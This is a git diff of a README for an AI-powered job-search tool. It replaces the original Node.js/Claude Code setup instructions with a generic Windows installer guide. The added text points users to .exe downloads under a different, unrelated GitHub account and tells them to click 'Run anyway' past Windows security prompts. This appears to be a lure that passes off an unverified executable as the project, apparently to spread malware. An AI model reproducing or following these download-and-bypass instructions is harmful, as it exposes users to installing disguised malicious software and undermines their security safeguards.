@@ -1,279 +1,81 @@
-# Push Job
+# 🤖 push-job - Automated job search assistance tool
 
-![Claude Code](https://img.shields.io/badge/Built%20with-Claude%20Code-orange?style=flat-square)
-![Node.js](https://img.shields.io/badge/Node.js-18%2B-green?style=flat-square)
-![Playwright](https://img.shields.io/badge/Playwright-1.44%2B-blue?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-lightgrey?style=flat-square)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ulrikeshifting204/push-job/releases)
 
-**AI-powered job search pipeline for cloud, cybersecurity, and tech roles.**
+push-job helps you find tech careers. It uses artificial intelligence to scan for roles in cloud computing, cybersecurity, and software development. The software automates tasks like writing cover letters and checking your gaps in certification. It works for you by managing your search pipeline from start to finish.
 
-Built with Claude Code. 15 modes. Cover letter generation, cert gap analysis, follow-up scheduling,
-portal scanning across 60+ companies, and a 12-dimension scoring system — all running locally from
-your terminal.
+## 📋 What the software does
 
-Before you start, make sure you have the following installed on your machine:
+This application handles the repetitive parts of your job search. It saves time by searching through job boards and applying filters that match your skills. It offers 15 different search modes. You can choose a mode based on your target role, such as SOC analyst, cloud engineer, or DevSecOps specialist.
 
-Node.js (Version 18 or higher is recommended)
+The application includes a built-in cover letter generator. It reads the job listing and your resume to highlight your strengths. It also performs a gap analysis on your certifications. This tells you which skills or credentials you need to get your next job. The built-in follow-up scheduler keeps your applications organized so you remember to check in with recruiters at the right time.
 
-Git
+## 🛠 System requirements
 
-Claude Code (Since this tool is built to run specifically with the claude CLI)
+Ensure your computer meets these requirements before you start:
 
-Step-by-Step Installation
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 8GB of RAM.
+* Storage: 500MB of free disk space.
+* Internet Connection: A stable link is necessary for the AI tools to fetch job data.
 
-Clone the Repository
+## 📥 Downloading the software
 
-Open your terminal or command prompt and run:
+You need to obtain the installer from the official repository page.
 
-Bash
+[Visit this page to download the latest setup file](https://github.com/Ulrikeshifting204/push-job/releases)
 
+1. Open the link above in your web browser. 
+2. Look for the section labeled "Assets".
+3. Click on the file that ends in .exe.
+4. Save the file to your computer.
 
+## ⚙️ Setting up the application
 
-git clone https://github.com/TushaeBXN/push-job.git
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Windows may show a security prompt. Click "More info" and then "Run anyway" if the system recognizes the installer as new.
+4. Follow the prompts on the screen to finish the installation.
+5. Create a folder on your desktop if you want to store your job search history in one place.
 
-cd push-job
+## 🚀 Running the program
 
-Install Dependencies
+After the installation finishes, find the push-job icon on your desktop or in your start menu. Open the application. On the first launch, the AI agent will initialize your profile. Provide your resume file when prompted. The application uses this file to build your search criteria.
 
-Install the necessary Node modules and the Playwright browser (which the tool uses to scan job portals):
+The main dashboard shows your current pipeline. You will see columns for "Applied," "Initial Screening," and "Follow-up Required." Use the top menu to select your preferred search mode. For example, if you focus on AWS or Azure roles, select the cloud mode. If you prefer security, select the cybersecurity or SOC analyst modes.
 
-Bash
+## 🔍 Understanding the search modes
 
-npm install
+The software includes 15 distinct modes. Each mode modifies how the AI interacts with job boards.
+* Cloud modes track roles focusing on infrastructure and server management.
+* Cybersecurity modes look for roles related to threat detection and vulnerability management.
+* DevSecOps modes monitor combined software development and security listings.
+* General career modes scan for broad tech roles that match your certification profile.
 
-npx playwright install chromium
+The AI updates its search queries daily. If you find that the software returns too many or too few results, toggle the filter settings in the configuration menu. You can narrow down your search by location, remote status, or seniority level.
 
-Set Up Your Profile
+## ✍️ Creating cover letters
 
-You need to create your personal configuration files. The repository includes examples to help you get started:
+Select a job from your list to see the details screen. Click the "Draft Cover Letter" button. The software reads the job requirements and your resume. It writes a draft that mentions your past projects and skills. Review the text in the window. You can edit the text before you save it as a document.
 
-Copy config/profile.example.yml to config/profile.yml and fill in your details (target roles, minimum salary, etc.).
+## 📊 Performing a gap analysis
 
-Copy templates/portals.example.yml to templates/portals.yml.
+Click the "Analyze Certifications" button on the dashboard. The application compares your current credentials against the roles you want to land. It generates a report. This report shows you which certificates add value to your resume. It also marks certificates that are no longer in demand for your desired path.
 
-Launch the Tool
+## 🗓 Managing follow-ups
 
-Since this is designed as a "brain" for Claude Code, you launch it by starting a Claude session inside the folder:
+The follow-up scheduler tracks your recent applications. It notifies you after five business days if you have not received a status update on a specific job. You can set the timer for a longer or shorter period in the settings menu. When a notification appears, the software provides a template for an email or message to the recruiter.
 
-Bash
+## 💡 Troubleshooting tips
 
-claude
+If the application fails to fetch job listings, check your internet connection. Ensure that your firewall does not block the application. You can reset the application cache if the dashboard shows empty screens. Go to the Settings tab, select "Advanced," and click "Clear Cache." This action does not delete your resume data or your saved cover letters.
 
-Once launched, Claude will detect the .claude/skills and CLAUDE.md files. It should automatically walk you through the remaining onboarding steps to verify your resume and portfolio files.
+If the AI produces results that do not match your experience, verify that the resume file you uploaded is readable. PDF files work best. Ensure the text inside your resume is clear and follows a standard format. Tables and complex graphics can sometimes hide information from the AI.
 
-Available Commands
+## 🛡 Security and privacy
 
-Once you are inside the claude session, you can use these custom slash commands to manage your job search:
+The application runs locally on your machine. Your resume and job search data stay on your hard drive. The AI agent connects to external servers only to fetch job listings and perform specific analysis tasks. We do not store your personal information on any outside servers. You keep full control over your data.
 
-CommandAction/scanScans 60+ job portals for new matching roles./evaluate [URL]Scores a job posting based on your 12-dimension profile./cover [URL]Generates a tailored cover letter for that specific role./resume [URL]Creates an ATS-optimized resume tailored to the job description./briefGives you a daily snapshot of your application pipeline.
+## 🌐 Community and support
 
----
-
-## Push Job vs. career-ops
-
-| Feature | career-ops | Push Job |
-|---------|-----------|---------|
-| Cover letter generation | ❌ | ✅ |
-| Cert gap analysis | ❌ | ✅ |
-| Follow-up scheduler | ❌ | ✅ |
-| Daily brief mode | ❌ | ✅ |
-| GitHub portfolio sync | ❌ | ✅ |
-| Scoring dimensions | 10 | **12** |
-| Portal focus | AI/SaaS | **Cloud + Cyber + Tech** |
-| Stack | Go + Node + Shell | **Node only** |
-| Cover letter template | ❌ | ✅ |
-| Defense/GovCloud portals | ❌ | ✅ |
-| Cert-to-role unlock matrix | ❌ | ✅ |
-
----
-
-## Quick Start
-
-```bash
-# Clone
-git clone https://github.com/TushaeThomas/push-job.git
-cd push-job
-
-# Install
-npm install
-npx playwright install chromium
-
-# Launch
-claude
-```
-
-Claude will detect missing personal files and walk you through first-run onboarding automatically.
-
----
-
-## Commands
-
-| Command | Description |
-|---------|-------------|
-| `/evaluate [URL]` | Score a job posting across 12 dimensions + cert gap analysis |
-| `/cover [URL]` | Generate a tailored cover letter (company-researched, no "I am writing to...") |
-| `/resume [URL]` | ATS-optimized resume tailored to a specific JD + PDF generation |
-| `/scan` | Scan 60+ cloud/cyber portals for new matching roles |
-| `/batch pipeline` | Evaluate all pending URLs in parallel |
-| `/tracker` | View full application pipeline by status |
-| `/interview [company]` | Role-specific technical + behavioral prep with mock Q&A |
-| `/certs` | Cert gap analysis across all Tier 1 applications |
-| `/followup` | Check overdue follow-ups and draft outreach emails |
-| `/brief` | Daily pipeline snapshot + one recommended action |
-| `/negotiate [amount]` | Salary negotiation scripts anchored to market data |
-| `/outreach [company]` | LinkedIn/cold email drafts |
-| `/portfolio-sync` | Sync GitHub repos into portfolio.md as proof points |
-| `/check` | Pipeline health check (files, tracker integrity, status validation) |
-
----
-
-## 12-Dimension Scoring System
-
-Every job is scored as a weighted composite (0–10):
-
-| # | Dimension | Weight | What It Measures |
-|---|-----------|--------|-----------------|
-| 1 | Role match | 12% | JD title alignment with target roles |
-| 2 | Tech stack | 12% | AWS, Azure, KQL, Sentinel, AD, honeynet overlap |
-| 3 | ATS keyword match | 10% | JD keywords present in your resume |
-| 4 | Cert alignment | 10% | Required/preferred certs vs. your tier profile |
-| 5 | Compensation fit | 10% | Comp vs. your minimum (from profile.yml) |
-| 6 | Growth trajectory | 8% | Will this role accelerate your path? |
-| 7 | Culture/mission | 8% | Company mission alignment |
-| 8 | Location/remote | 8% | Remote-friendly or target city match |
-| 9 | Portfolio relevance | 8% | GitHub proof points matching the JD |
-| 10 | Interview probability | 6% | Likelihood of passing ATS + screen |
-| 11 | Urgency | 4% | Expiring posting, hot company |
-| 12 | Network/referral | 4% | Warm connection or community overlap |
-
-**Score tiers:**
-
-| Score | Tier | Action |
-|-------|------|--------|
-| 8.0+ | Apply Now | Tailored resume + cover letter today |
-| 6.0–7.9 | Apply/Tailor | Polish resume, generate cover letter |
-| 4.0–5.9 | Low Priority | Apply only if the week is slow |
-| < 4.0 | Skip | Log and move on |
-
----
-
-## Cert Tier Profile
-
-The scoring engine uses a tiered cert profile to assess alignment and prioritize study:
-
-**Tier 1 — In Progress:** AWS CLF-C02 · CompTIA CySA+
-**Tier 2 — Next:** AWS SAA-C03 · Security+ · AZ-500
-**Tier 3 — Long-term:** AWS SAP-C02 · CISSP · CCSP
-
-Run `/certs` to see which certs appear most in your active applications.
-
----
-
-## Portal Coverage
-
-**60+ companies across:**
-
-| Category | Companies |
-|----------|-----------|
-| Cloud Providers | AWS, Azure, GCP, Cloudflare, Fastly, DigitalOcean, Akamai |
-| Cloud MSPs | Rackspace, 2nd Watch, Logicworks, Presidio |
-| Cybersecurity (EDR/XDR) | CrowdStrike, SentinelOne, Huntress, Rapid7, Cybereason |
-| Network/Identity | Palo Alto Networks, Okta, Zscaler, Fortinet, Tenable |
-| SIEM/SOC | Splunk, Elastic, Devo, Sumo Logic, Arctic Wolf, Exabeam |
-| DevSecOps/CSPM | Wiz, Snyk, HashiCorp, Lacework, Orca Security, Aqua |
-| Defense/GovCloud | Booz Allen, SAIC, Leidos, MITRE, ManTech, GDIT |
-| Enterprise | Microsoft, IBM, Accenture, Deloitte, KPMG |
-| AI/Automation | Anthropic, Databricks, Weights & Biases, Scale AI |
-| Fintech | Bank of America, Wells Fargo, LendingTree |
-| Job Boards | LinkedIn, Wellfound, Dice, RemoteOK, CyberSecJobs |
-
----
-
-## Project Structure
-
-```
-push-job/
-├── CLAUDE.md                    ← Agent brain (scoring, routing, onboarding)
-├── README.md
-├── package.json
-├── .gitignore
-├── resume.md                    ← Your resume (gitignored)
-├── portfolio.md                 ← GitHub portfolio (gitignored)
-├── config/
-│   ├── profile.example.yml      ← Copy to profile.yml and fill in
-│   └── scoring.yml              ← Tweak scoring weights
-├── modes/
-│   ├── _shared.md               ← Archetypes, cert tiers, conventions
-│   ├── evaluate.md              ← 12-dimension evaluation
-│   ├── cover.md                 ← Cover letter generation
-│   ├── resume-mode.md           ← ATS resume tailoring + PDF
-│   ├── scan.md                  ← Portal scanning
-│   ├── batch.md                 ← Parallel batch evaluation
-│   ├── tracker.md               ← Application status
-│   ├── interview.md             ← Interview prep
-│   ├── certs.md                 ← Cert gap analysis
-│   ├── followup.md              ← Follow-up scheduler
-│   ├── brief.md                 ← Daily pipeline brief
-│   ├── negotiate.md             ← Salary negotiation
-│   ├── outreach.md              ← LinkedIn/cold outreach
-│   └── portfolio-sync.md        ← GitHub portfolio sync
-├── templates/
-│   ├── resume.html              ← ATS-optimized HTML resume
-│   ├── cover.html               ← Cover letter template
-│   ├── portals.example.yml      ← 60+ companies (copy to portals.yml)
-│   └── states.yml               ← Canonical application statuses
-├── scripts/
-│   ├── generate-pdf.mjs         ← Playwright PDF generator
-│   ├── tracker-merge.mjs        ← Dedup + merge TSV additions
-│   └── pipeline-check.mjs       ← Health checks
-├── data/                        ← gitignored (your personal data)
-├── reports/                     ← gitignored (per-job eval reports)
-├── output/                      ← gitignored (generated PDFs)
-├── interview-prep/
-│   └── story-bank.md            ← STAR story library
-├── examples/
-│   └── resume.example.md        ← Resume format reference
-├── docs/
-│   └── SETUP.md                 ← Full setup guide
-└── .claude/skills/push-job/
-    └── push-job.md              ← Claude Code skill definition
-```
-
----
-
-## Philosophy
-
-**Quality over quantity.**
-
-Push Job is designed to produce 3–5 strong, tailored applications per week — not 50
-spray-and-pray submissions. Every application has a researched cover letter, a keyword-optimized
-resume, and a clear reason to apply.
-
-The agent prepares. You review. You submit.
-
----
-
-## Built By
-
-**Tushae Thomas (Brian)**
-AWS re/Start Student · Azure SOC Practitioner · Cybersecurity Builder
-
-- Background: Microsoft Sentinel, KQL, Active Directory, honeynet-based threat detection
-- Pursuing: AWS Cloud Practitioner (CLF-C02) · CompTIA CySA+
-- Target: Cloud Engineer | SOC Analyst | DevSecOps | Cloud Security Engineer
-- Location: Charlotte, NC
-- Brand: BER/TMG
-- GitHub: [TushaeThomas](https://github.com/TushaeThomas)
-
----
-
-## Topics
-
-`job-search` `claude-code` `cloud` `cybersecurity` `career` `ai-agent` `open-source`
-`devsecops` `soc-analyst` `aws` `azure` `playwright`
-
----
-
-## License
-
-MIT — use it, fork it, build on it.
+You can check the repository for updates or to report issues. Navigate back to the main release page if you want to see if a newer version exists. Updates help the AI agent work better with current job board formats. If you have questions about how to use the software, look through the issues section of the project repository. Users often share tips on how to optimize search results for specific roles like SOC analyst or cloud architect.
